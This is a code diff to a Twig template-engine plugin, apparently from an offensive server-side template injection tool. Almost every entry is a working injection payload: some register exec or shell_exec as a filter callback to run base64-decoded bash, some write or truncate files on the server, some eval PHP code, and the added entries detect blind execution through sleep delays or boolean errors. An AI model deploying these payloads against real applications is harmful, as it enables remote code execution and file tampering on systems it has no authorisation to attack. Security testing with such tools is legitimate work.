@@ -42,17 +42,20 @@ class Twig_v1(php.Php):
                 'test_render': f'{{% if 1 is sameas(1) %}}{{%set a=(1..3)|join%}}{{% endif %}}{{%set b=[a,"{rand.randstrings[0]}"]|join%}}',
                 'test_render_expected': f'123{rand.randstrings[0]}'
             },
-            'write': {
-                'call': 'inject',
-                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'")}}}}""",
-                'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
-            },
             # Hackish way to evaluate PHP code
             'evaluate': {
                 'call': 'execute',
                 'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                 'test_os': 'echo PHP_OS;',
                 'test_os_expected': r'^[\w-]+$'
+            },
+            'evaluate_boolean': {
+                'call': 'execute_blind',
+                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
+            },
+            'evaluate_blind': {
+                'call': 'execute',
+                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
             },
             'execute': {
                 'call': 'render',
@@ -63,13 +66,19 @@ class Twig_v1(php.Php):
             'execute_error': {
                 'execute': """{{{{_self.env.registerUndefinedFilterCallback("shell_exec")}}}}{{%set b=_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")%}}""",
             },
+            # Hackish way to check success
+            'execute_boolean': {
+                'call': 'inject',
+                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("shell_exec")}}}}{{{{ 1 / (_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{echo,SSTIMAP}}'")|trim('\\n') ends with "SSTIMAP")}}}}"""
+            },
             'execute_blind': {
                 'call': 'inject',
                 'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'")}}}}"""
             },
-            'evaluate_blind': {
-                'call': 'execute',
-                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
+            'write': {
+                'call': 'inject',
+                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'")}}}}""",
+                'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
             },
         })
         
